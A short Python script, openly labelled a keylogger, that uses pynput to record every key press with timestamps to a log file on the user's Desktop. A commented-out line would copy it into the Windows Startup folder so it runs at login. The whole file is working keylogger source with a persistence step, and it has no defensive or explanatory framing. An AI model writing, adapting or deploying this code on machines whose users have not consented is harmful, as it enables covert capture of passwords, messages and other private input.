from pynput.keyboard import Listener

import os
import logging
#from shutil import copyfile

username = os.getlogin() #Gets Username of current computer for dynamic use
logging_directory = f"C:/Users/{username}/Desktop" #The file path where the keylogger file will be saved

#Runs the script upon startup
#copyfile("Keylogger.py", f"C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/Keylogger.py")

#Name of File & the directory of where it is to be saved / DEBUG level so every keyboard input can be seen / Format of how the keyboard inputs are logged (time & date)
logging.basicConfig(filename = f"{logging_directory}/mylog.txt", level = logging.DEBUG, format = "%(asctime)s: %(message)s")

#Function to handle the keyboard inputs being logged
def key_handler(key):
    logging.info(key)

#The Actual Listener for the keyboard inputs
with Listener(on_press = key_handler) as listener:
    listener.join()